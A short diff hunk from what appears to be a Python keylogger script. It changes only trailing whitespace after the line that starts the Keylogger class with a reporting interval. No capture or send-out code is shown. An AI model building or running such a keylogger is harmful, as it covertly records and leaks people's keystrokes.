@@ -54,4 +54,4 @@ class Keylogger:
 
 if __name__ == "__main__":
     Keylogger(interval=SEND_REPORT_EVERY).startI()
-    
+
